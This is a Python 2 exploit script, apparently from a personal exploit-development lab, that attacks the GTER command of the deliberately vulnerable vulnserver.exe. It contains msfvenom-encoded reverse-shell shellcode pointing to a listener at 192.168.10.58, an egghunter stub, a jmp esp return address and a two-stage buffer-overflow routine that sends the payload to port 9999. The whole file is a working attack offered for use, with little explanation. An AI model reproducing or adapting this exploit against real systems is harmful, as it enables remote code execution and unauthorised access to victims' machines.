#!/usr/bin/python
#
# exploit code for the GTER command from "vulnserver.exe"
# previous version (see "test" repository) didn't work properly
# this one returns a reverse shell as expected.
#

import socket
import os
import sys
import struct

# msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f c LHOST=192.168.10.58 -v shellcode
#Payload size: 351 bytes
shellcode = ("\xd9\xc6\xba\x9d\x07\x14\xe6\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x31\x57\x17\x03\x57\x17\x83\x5a\x03\xf6\x13\x98\xe4\x74"
"\xdb\x60\xf5\x18\x55\x85\xc4\x18\x01\xce\x77\xa9\x41\x82\x7b"
"\x42\x07\x36\x0f\x26\x80\x39\xb8\x8d\xf6\x74\x39\xbd\xcb\x17"
"\xb9\xbc\x1f\xf7\x80\x0e\x52\xf6\xc5\x73\x9f\xaa\x9e\xf8\x32"
"\x5a\xaa\xb5\x8e\xd1\xe0\x58\x97\x06\xb0\x5b\xb6\x99\xca\x05"
"\x18\x18\x1e\x3e\x11\x02\x43\x7b\xeb\xb9\xb7\xf7\xea\x6b\x86"
"\xf8\x41\x52\x26\x0b\x9b\x93\x81\xf4\xee\xed\xf1\x89\xe8\x2a"
"\x8b\x55\x7c\xa8\x2b\x1d\x26\x14\xcd\xf2\xb1\xdf\xc1\xbf\xb6"
"\x87\xc5\x3e\x1a\xbc\xf2\xcb\x9d\x12\x73\x8f\xb9\xb6\xdf\x4b"
"\xa3\xef\x85\x3a\xdc\xef\x65\xe2\x78\x64\x8b\xf7\xf0\x27\xc4"
"\x34\x39\xd7\x14\x53\x4a\xa4\x26\xfc\xe0\x22\x0b\x75\x2f\xb5"
"\x6c\xac\x97\x29\x93\x4f\xe8\x60\x50\x1b\xb8\x1a\x71\x24\x53"
"\xda\x7e\xf1\xf4\x8a\xd0\xaa\xb4\x7a\x91\x1a\x5d\x90\x1e\x44"
"\x7d\x9b\xf4\xed\x14\x66\x9f\xd1\x41\x62\x65\xba\x93\x72\x88"
"\x66\x1d\x94\xc0\x86\x4b\x0f\x7d\x3e\xd6\xdb\x1c\xbf\xcc\xa6"
"\x1f\x4b\xe3\x57\xd1\xbc\x8e\x4b\x86\x4c\xc5\x31\x01\x52\xf3"
"\x5d\xcd\xc1\x98\x9d\x98\xf9\x36\xca\xcd\xcc\x4e\x9e\xe3\x77"
"\xf9\xbc\xf9\xee\xc2\x04\x26\xd3\xcd\x85\xab\x6f\xea\x95\x75"
"\x6f\xb6\xc1\x29\x26\x60\xbf\x8f\x90\xc2\x69\x46\x4e\x8d\xfd"
"\x1f\xbc\x0e\x7b\x20\xe9\xf8\x63\x91\x44\xbd\x9c\x1e\x01\x49"
"\xe5\x42\xb1\xb6\x3c\xc7\xc1\xfc\x1c\x6e\x4a\x59\xf5\x32\x17"
"\x5a\x20\x70\x2e\xd9\xc0\x09\xd5\xc1\xa1\x0c\x91\x45\x5a\x7d"
"\x8a\x23\x5c\xd2\xab\x61")

# egghunter will search for T00WT00W and jump right after it
egghunter = ("\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x54\x30"
"\x30\x57\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

# Crash at 151 bytes actually
crash = "\x41" * (147 - len(egghunter) - 10)

# jmp esp address found in essfunc.dll
addr = struct.pack("<I", 0x62501203)

# that's our crash string :
# - GTER command + a few chars (actually, only a '.' is mandatory)
# - a few nops, then our egghunter
# - followed by a few more nops
# - then our EIP overwrite (jmp esp)
# - contents of ESP after crash (jump-back in order to land exactly on the egghunter)
# - and a few nops
buffer = "GTER /.:/" + crash + egghunter + "\x90" * 10 + addr + "\x90" * 10 + "\xeb\xc4"

print "[*] Sending ..."
# iterates through a few commands, maybe one of them will keep my payload...
#for c in ["HELP", "GMON", "GDOG", "HTER", "LTER", "KSTAN"]:
for c in ["TRUN ."]:
        expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
	expl.connect(("192.168.10.178", 9999))
	print expl.recv(1024)
	# We send our final shellcode first, as it will reside in a malloc()'ed area
	# Second stage payload here with egg ("T00WT00W")
	egg = c + " " + "T00WT00W" + shellcode
	expl.send(egg)
	print "len: " + str(len(egg))

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.10.178", 9999))
print expl.recv(1024)
# Then we send our crash string with our first stage payload
expl.send(buffer)
expl.close()
